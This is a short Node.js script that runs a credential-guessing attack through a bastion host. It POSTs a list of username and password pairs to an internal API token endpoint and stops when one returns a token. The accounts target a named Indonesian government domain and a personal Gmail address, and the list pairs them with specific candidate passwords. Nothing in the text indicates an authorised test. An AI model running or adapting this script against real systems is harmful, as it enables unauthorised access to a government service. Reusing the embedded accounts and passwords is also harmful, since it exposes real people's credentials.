const { connectBastion, runCmd } = require('./remote_exec');

async function main() {
  const bastion = await connectBastion();
  
  const combos = [
    { identity: 'admin@example.com', secret: 'changeme' },
    { identity: 'admin@tapselkab.go.id', secret: '@#Tim1t42026' },
    { identity: 'admin@tapselkab.go.id', secret: '@programmer' },
    { identity: 'hnf@tapselkab.go.id', secret: '@programmer' },
    { identity: 'root@tapselkab.go.id', secret: '@#Tim1t42026' },
    { identity: 'root@tapselkab.go.id', secret: '@programmer' },
    { identity: 'hnf', secret: '@programmer' },
    { identity: 'admin', secret: '@#Tim1t42026' },
    { identity: 'admin', secret: '@programmer' },
    { identity: 'hanifconsultans@gmail.com', secret: '@programmer' },
    { identity: 'hanifconsultans@gmail.com', secret: '@#Tim1t42026' },
    { identity: 'hanifconsultans@gmail.com', secret: 'changeme' },
  ];

  for (const c of combos) {
    const payload = JSON.stringify(c).replace(/"/g, '\\"');
    const cmd = `curl -s -X POST http://192.168.1.106:81/api/tokens -H "Content-Type: application/json" -d "${payload}"`;
    const res = await new Promise(resolve => {
      bastion.exec(cmd, (err, stream) => {
        if (err) return resolve({ err });
        let out = '';
        stream.on('data', d => out += d);
        stream.on('close', () => resolve({ out }));
      });
    });
    console.log(c.identity, c.secret, '->', res.out);
    if (res.out && res.out.includes('token')) {
      console.log('SUCCESS! Found token for', c.identity);
      break;
    }
  }

  bastion.end();
}

main().catch(console.error);
